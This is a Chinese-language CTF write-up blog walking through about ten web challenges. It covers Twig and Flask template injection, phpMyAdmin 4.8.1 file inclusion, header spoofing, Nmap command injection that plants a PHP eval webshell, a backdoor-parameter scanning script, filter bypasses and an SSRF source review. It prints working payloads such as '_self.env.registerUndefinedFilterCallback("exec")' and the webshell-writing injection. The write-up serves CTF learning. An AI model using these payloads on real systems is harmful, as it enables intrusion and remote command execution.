<p>？？？</p>
<p>什么意思</p>
<p><img src="https://img-blog.csdnimg.cn/20201102181051434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>登登</p>
<p>模版注入</p>
<p>主要是我sql和rce试过了</p>
<p>都不行，就拿这个用了</p>
<p>尝试一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>twig模版注入</p>
<p>拿到flag</p>
<p>[BJDCTF2020]Mark loves cat</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514153039668.png" alt="image-20240514153039668"></p>
<p>emm就是，怎么说，查看源代码没什么用</p>
<p>所以扫文件发现后台的git文件</p>
<p>再进行githack，下载下载下来了文件</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514153143827.png" alt="image-20240514153143827"></p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514153255877.png" alt="image-20240514153255877"></p>
<p>发现了这个！！！</p>
<p>所以我们要想办法，把$handsome之类的改为flag</p>
<p>最简单的就是在get里面yds&#x3D;flag</p>
<p>拿到flag</p>
<p>[GWCTF 2019]我有一个数据库</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514145231899.png" alt="image-20240514145231899"></p>
<p>除此之外啥也没有，猜测是文件泄露</p>
<p>dir扫描发现phpmyadmin可以进入</p>
<p>进入之后</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514145323308.png" alt="image-20240514145323308"></p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514145636934.png" alt="image-20240514145636934"></p>
<p>这个时候就需要介绍一下4.8.1的专属漏洞</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0d75017c154f">phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613） - 简书</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog">【首发】phpmyadmin4.8.1后台getshell</a> </p>
<p>两位大神，已经讲得很详细了</p>
<p>emm，简单来说，emm也不简单</p>
<p>就是有一个白名单，只要是白名单就可以进入，但是因为phpmyadmin人太好了，所以让我们传后面的参数，但是要使用？隔开</p>
<p>所以payload：</p>
<p>?target&#x3D;db_sql.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p>
<p>很多题解都要把问号二次url编码</p>
<p>但是我这里不用，嘻嘻</p>
<p>就拿到了flag</p>
<p>[MRCTF2020]PYWebsite</p>
<p>写简单点，要下班了</p>
<p>回去玩原神了</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514220722582.png" alt="image-20240514220722582"></p>
<p>我没有扫码，正确选择</p>
<p>view-source查看源代码</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514220753419.png" alt="image-20240514220753419"></p>
<p>我一开始还在找hex_md5的解决方法</p>
<p>才发现直接.&#x2F;flag.php进入页面</p>
<p>我透！！！！！！</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514220856924.png" alt="image-20240514220856924"></p>
<p>我和购买者</p>
<p>所以说，我也可以进是吧</p>
<p>尝试xff：127.0.0.1</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514220940423.png" alt="image-20240514220940423"></p>
<p>拿下！！！！</p>
<p>[WesternCTF2018]shrine</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240515210916400.png" alt="image-20240515210916400"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import flask </span><br><span class="line">import os </span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;) </span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;) </span><br><span class="line">def index(): </span><br><span class="line">	return open(__file__).read() </span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/shrine/&#x27;) </span><br><span class="line">def shrine(shrine): </span><br><span class="line">	def safe_jinja(s): </span><br><span class="line">		s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;) 			</span><br><span class="line">		blacklist = [&#x27;config&#x27;, &#x27;self&#x27;] </span><br><span class="line">		return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s</span><br><span class="line">		return flask.render_template_string(safe_jinja(shrine)) </span><br><span class="line">if __name__ == &#x27;__main__&#x27;: app.run(debug=True)</span><br></pre></td></tr></table></figure>

<p>所以我们一部分一部分拆解一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import flask </span><br><span class="line">import os </span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;) </span><br><span class="line">//注册了一个名为FLAG的config，所以这个config大概率就是flag</span><br></pre></td></tr></table></figure>

<p>所以我们就是要访问config</p>
<p>但是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">blacklist = [&#x27;config&#x27;, &#x27;self&#x27;] </span><br></pre></td></tr></table></figure>

<p>所以不可以直接访问config</p>
<p>这边首先确认一下怎么注入吧</p>
<p>这边采取ssti（我还是不懂怎么判断是不是模版注入）</p>
<p>经过查询之后（flask框架没学深的好难过）</p>
<p>发现了两个函数可以绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get_flashed_messages.__globals__[&#x27;current_app&#x27;].config</span><br><span class="line">url_for.__globals__[&#x27;current_app&#x27;].config</span><br></pre></td></tr></table></figure>

<p>这两个是py的内置函数</p>
<p>知识点放最后了</p>
<p>所以</p>
<p>就是传上去，同时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@app.route(&#x27;/shrine/&#x27;) </span><br></pre></td></tr></table></figure>

<p>人家告诉你就是从这个路径进去了，就按人家的走（我没有阴阳）</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240515212951135.png" alt="image-20240515212951135"></p>
<p>get it</p>
<h4 id="url-for和get-flashed-message函数介绍"><a href="#url-for和get-flashed-message函数介绍" class="headerlink" title="url_for和get_flashed_message函数介绍"></a>url_for和get_flashed_message函数介绍</h4><p>url_for这个可以用来构造url，接受函数名作为第一个参数</p>
<p>get_flashed_message()是通过flash()传入闪现信息列表的，能够把字符串对象表示的信息加入到一个消息列表，然后通过调用get_flashed_message()来取出。</p>
<p>[ASIS 2019]Unicorn shop</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514211603682.png" alt="image-20240514211603682"></p>
<p>怎么说这道题呢？</p>
<p>我只能说，不是哥们</p>
<p>我真的是醉了</p>
<p>买 1 输入9也不行，我在想是不是有问题</p>
<p>我觉得就是9输进去之后就不是9了，所以不对</p>
<p>所以到处看看</p>
<p>看到unicorn</p>
<p>emm</p>
<p>应该是提示的unicode吧，我实在找不到线索了</p>
<p>所以呢，也就是说，emm，这个去找一个code解码之后很大的字符试试</p>
<p>找了个10000</p>
<h1 id="፼"><a href="#፼" class="headerlink" title="፼"></a>፼</h1><p>好好好</p>
<p>拿到flag</p>
<p>[网鼎杯 2020 朱雀组]Nmap</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240516202056445.png" alt="image-20240516202056445"></p>
<p>首先试试127.0.0.1</p>
<p>是可以进去的。但是没什么用。</p>
<p>换了几个，发现都是能进入</p>
<p>但是都只是</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240516202205136.png" alt="image-20240516202205136"></p>
<p>而且这个页面会改变的只有hostname</p>
<p>尝试了一下ssti注入，发现没什么用</p>
<p>查阅发现这道题使用的通过nmap语句进行创建一个新的文件，并且将一句话木马传入其中，然后再进行命令执行</p>
<p>同时，我们发现，这道题禁用了php</p>
<p>所以构建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; &lt;? echo @eval($_POST[&quot;a&quot;]);?&gt; -oG a.phtml &#x27;</span><br></pre></td></tr></table></figure>

<p>oG是nmap语法，放到最后一起总结了</p>
<p>上传这个之后，我们发现被哔了</p>
<p>这是因为我们传上去的不是一个ip地址</p>
<p>所以我们这里要同时传一个可通过的地址上去</p>
<p>所以我们采用 | （前面当参数，执行后面）</p>
<p>最终构建payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | &#x27; &lt;? echo @eval($_POST[&quot;a&quot;]);?&gt; -oG a.phtml &#x27;</span><br></pre></td></tr></table></figure>

<p>输入之后的同时，我们就创建了一个名为a的phtml文件</p>
<p>所以我们访问之后，post传参一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure>

<p>拿下！</p>
<h4 id="Nmap："><a href="#Nmap：" class="headerlink" title="Nmap："></a>Nmap：</h4><p>选项 解释<br>-oN 标准保存<br>-oX XML保存<br>-oG <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Grep&spm=1001.2101.3001.7020">Grep</a>保存<br>-oA 保存到所有格式<br>-append-output 补充保存文件</p>
<p>例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">选项-oG</span><br><span class="line">将结果Grep保存。</span><br><span class="line"></span><br><span class="line">nmap -F -oG test.txt 192.168.23.1</span><br><span class="line"></span><br><span class="line">选项-oA</span><br><span class="line">该选项可将扫描结果以标准格式、XML格式和Grep格式一次性保存，分别放在.nmap，.xml和.gnmap文件中。</span><br><span class="line"></span><br><span class="line">nmap -F -oA test 192.168.3.2</span><br></pre></td></tr></table></figure>



<p>[强网杯 2019]高明的黑客</p>
<img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240516210127863.png" alt="image-20240516210127863" style="zoom:80%;">

<p>下载源码之后解压</p>
<p>发现了三千多文件，要找到可以用的参数</p>
<p>脚本如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">print(&#x27;开始时间：  &#x27;+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(100)  							  			#这儿设置最大的线程数</span><br><span class="line">filePath = r&quot;D:\phpstudy_pro\WWW\src&quot;</span><br><span class="line">os.chdir(filePath)													#改变当前的路径</span><br><span class="line">requests.adapters.DEFAULT_RETRIES = 5								#设置重连次数，防止线程数过高，断开连接</span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = False											 # 设置连接活跃状态为False</span><br><span class="line">def get_content(file):</span><br><span class="line">    s1.acquire()</span><br><span class="line">    print(&#x27;trying   &#x27;+file+ &#x27;     &#x27;+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    with open(file,encoding=&#x27;utf-8&#x27;) as f:							#打开php文件，提取所有的$_GET和$_POST的参数</span><br><span class="line">            gets = list(re.findall(&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;, f.read()))</span><br><span class="line">            posts = list(re.findall(&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;, f.read()))</span><br><span class="line">    data = &#123;&#125;														#所有的$_POST</span><br><span class="line">    params = &#123;&#125;														#所有的$_GET</span><br><span class="line">    for m in gets:</span><br><span class="line">        params[m] = &quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br><span class="line">    for n in posts:</span><br><span class="line">        data[n] = &quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br><span class="line">    url = &#x27;http://127.0.0.1/src/&#x27;+file</span><br><span class="line">    req = session.post(url, data=data, params=params)			#一次性请求所有的GET和POST</span><br><span class="line">    req.close()												# 关闭请求  释放内存</span><br><span class="line">    req.encoding = &#x27;utf-8&#x27;</span><br><span class="line">    content = req.text</span><br><span class="line">    #print(content)</span><br><span class="line">    if &quot;xxxxxx&quot; in content:									#如果发现有可以利用的参数，继续筛选出具体的参数</span><br><span class="line">        flag = 0</span><br><span class="line">        for a in gets:</span><br><span class="line">            req = session.get(url+&#x27;?%s=&#x27;%a+&quot;echo &#x27;xxxxxx&#x27;;&quot;)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()												# 关闭请求  释放内存</span><br><span class="line">            if &quot;xxxxxx&quot; in content:</span><br><span class="line">                flag = 1</span><br><span class="line">                break</span><br><span class="line">        if flag != 1:</span><br><span class="line">            for b in posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:&quot;echo &#x27;xxxxxx&#x27;;&quot;&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()												# 关闭请求  释放内存</span><br><span class="line">                if &quot;xxxxxx&quot; in content:</span><br><span class="line">                    break</span><br><span class="line">        if flag == 1:													#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span><br><span class="line">            param = a</span><br><span class="line">        else:</span><br><span class="line">            param = b</span><br><span class="line">        print(&#x27;找到了利用文件： &#x27;+file+&quot;  and 找到了利用的参数：%s&quot; %param)</span><br><span class="line">        print(&#x27;结束时间：  &#x27; + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line">for i in files:															#加入多线程</span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最终找到了利用文件： xk0SzyKwfzw.php </p>
<p>找到了利用的参数：Efa5BVG</p>
<p>最后构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xk0SzyKwfzw.php?Efa5BVG=cat /flag</span><br></pre></td></tr></table></figure>

<p>找到flag</p>
<p>[WUSTCTF2020]朴实无华</p>
<p>先扫描文件，发现robots.txt</p>
<p>之后发现</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514164746970.png" alt="image-20240514164746970"></p>
<p>抓包访问</p>
<p>发现</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514164317787.png" alt="image-20240514164317787"></p>
<p>前往发现代码</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514164708798.png" alt="image-20240514164708798"></p>
<p>level1：</p>
<p>num&lt;2020 num+1&gt;2021</p>
<p>怎么说，因为intval，所以15e10&#x3D;15</p>
<p>但是15e10+1就是15e10+1代表的值</p>
<p>所以传这个就行</p>
<p>level2：</p>
<p>$md5&#x3D;&#x3D;md5($md5)</p>
<p>但是是弱比较，所以就是说0exxxxxx&#x3D;0exxxxxxxx</p>
<p>找到一个0e开头且md5值0e开头的就行</p>
<p>level3：</p>
<p>system(get_flag)</p>
<p>先传个ls上去，这里是过滤了cat和空格</p>
<p>找到</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514165826395.png" alt="image-20240514165826395"></p>
<p>所以就是绕过空格和cat</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tac$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>

<p>拿到flag</p>
<p>[CISCN2019 华东南赛区]Web11</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240515215106156.png" alt="image-20240515215106156"></p>
<p>说实话，我是笨笨的</p>
<p>但是看到这道题，怎么说</p>
<p>看到了xff</p>
<p>又看到右上角的ip</p>
<p>我就知道了</p>
<p>呜哈哈哈哈</p>
<p>xff可以改ip</p>
<p>所以尝试抓包</p>
<p>将xff改为127.0.0.1</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240515215342883.png" alt="image-20240515215342883"></p>
<p>成功了</p>
<p>这里又尝试了一下直接cat &#x2F;flag</p>
<p>不行</p>
<p>但是，我看到了</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240515215426925.png" alt="image-20240515215426925"></p>
<p>模版注入</p>
<p>多是一件美事</p>
NaN

<p>秒了，直接秒了</p>
<p><img src="/2024/05/12/buu%E5%88%B7%E9%A2%98%E9%9B%86/%E6%80%BB%E7%BB%93/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240515215521462.png" alt="image-20240515215521462"></p>
<p>拿到flag</p>
<p>[De1CTF 2019]SSRF Me</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line"># #encoding=utf-8</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&#x27;latin1&#x27;)</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line">secert_key = os.urandom(16)</span><br><span class="line"> </span><br><span class="line">class Task:</span><br><span class="line">    def __init__(self, action, param, sign, ip):		#是一个简单的赋值函数</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        if(not os.path.exists(self.sandbox)):		#如果没有该文件夹，则创立一个文件夹</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"> </span><br><span class="line">    def Exec(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[&#x27;code&#x27;] = 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;)   #注意w，可以对result.txt文件进行修改</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                if (resp == &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&#x27;data&#x27;] = resp</span><br><span class="line">                else:</span><br><span class="line">                    print resp</span><br><span class="line">                    tmpfile.write(resp)	#这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&#x27;code&#x27;] = 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;)	#打开方式为只读</span><br><span class="line">                result[&#x27;code&#x27;] = 200</span><br><span class="line">                result[&#x27;data&#x27;] = f.read()	#读取result.txt中的数据</span><br><span class="line">            if result[&#x27;code&#x27;] == 500:</span><br><span class="line">                result[&#x27;data&#x27;] = &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&#x27;code&#x27;] = 500</span><br><span class="line">            result[&#x27;msg&#x27;] = &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"> </span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"> </span><br><span class="line">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"> </span><br><span class="line">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])		#注意这个绑定，接下来的几个函数都很重要，这个相当于c语言里面的主函数，接下来是调用其他函数的过程</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(&quot;action&quot;))		#cookie传递action参数，对应不同的处理方式</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))		#传递get方式的参数param</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))			#cookie传递sign参数sign</span><br><span class="line">    ip = request.remote_addr				#获取请求端的ip地址</span><br><span class="line">    if(waf(param)):			#调用waf函数进行过滤</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task = Task(action, param, sign, ip) 			#创建Task类对象</span><br><span class="line">    return json.dumps(task.Exec())			#以json的形式返回到客户端</span><br><span class="line"> </span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br><span class="line"> </span><br><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    try:</span><br><span class="line">        return urllib.urlopen(param).read()[:50]		#这个可以利用为访问flag.txt。读取然后为下一步将flag.txt文件中的东西放到result.txt中做铺垫</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Connection Timeout&quot;</span><br><span class="line"> </span><br><span class="line">def getSign(action, param):				#getSign的作用是拼接secret_key,param,action，然后返回拼接后的字符串的md5加密值</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"> </span><br><span class="line">def md5(content):			#将传入的字符串进行md5加密</span><br><span class="line">    return hashlib.md5(content).hexdigest()</span><br><span class="line"> </span><br><span class="line">def waf(param):						#防火墙的作用是判断开头的几个字母是否是gopher 或者是file  如果是的话，返回true</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.debug = False</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=9999)</span><br></pre></td></tr></table></figure>

<p>flask框架啊，啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！</p>
<p>慢慢看吧</p>
<p>跟着网上的教程看，小白还是不要逞强了</p>
<p>这道题三个路由</p>
<p>@app.route(“&#x2F;geneSign”, methods&#x3D;[‘GET’, ‘POST’])<br>@app.route(‘&#x2F;De1ta’,methods&#x3D;[‘GET’,’POST’])<br>@app.route(‘&#x2F;‘)</p>
<p>首先先是delta，因为它最多、</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])		#注意这个绑定，接下来的几个函数都很重要，这个相当于c语言里面的主函数，接下来是调用其他函数的过程</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(&quot;action&quot;))		#cookie传递action参数，对应不同的处理方式</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))		#传递get方式的参数param</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))			#cookie传递sign参数sign</span><br><span class="line">    ip = request.remote_addr				#获取请求端的ip地址</span><br><span class="line">    if(waf(param)):			#调用waf函数进行过滤</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task = Task(action, param, sign, ip) 			#创建Task类对象</span><br><span class="line">    return json.dumps(task.Exec())			#以json的形式返回到客户端</span><br></pre></td></tr></table></figure>

<p>所以说，我们要用get方式传param</p>
<p>在cookie传递sign和action</p>
<p>同时要经过waf的过滤</p>
<p>所以我们去看看waf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def waf(param):						#防火墙的作用是判断开头的几个字母是否是gopher 或者是file  如果是的话，返回true</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br></pre></td></tr></table></figure>

<p>所以，我们这里不能使用gopher和file开头的</p>
<p>之后我们再回去看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">task = Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br></pre></td></tr></table></figure>

<p>发现，要创建一个task对象，并且执行exec方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def Exec(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[&#x27;code&#x27;] = 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;)   #注意w，可以对result.txt文件进行修改</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                if (resp == &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&#x27;data&#x27;] = resp</span><br><span class="line">                else:</span><br><span class="line">                    print resp</span><br><span class="line">                    tmpfile.write(resp)	#这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&#x27;code&#x27;] = 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;)	#打开方式为只读</span><br><span class="line">                result[&#x27;code&#x27;] = 200</span><br><span class="line">                result[&#x27;data&#x27;] = f.read()	#读取result.txt中的数据</span><br><span class="line">            if result[&#x27;code&#x27;] == 500:</span><br><span class="line">                result[&#x27;data&#x27;] = &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&#x27;code&#x27;] = 500</span><br><span class="line">            result[&#x27;msg&#x27;] = &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br></pre></td></tr></table></figure>

<p>显示通过checkSign方法检测登录</p>
<p>所以先去看看checkSign看看这么个事</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br></pre></td></tr></table></figure>

<p>如果if成真就返回true，所以我们看看getSign这么个事</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>

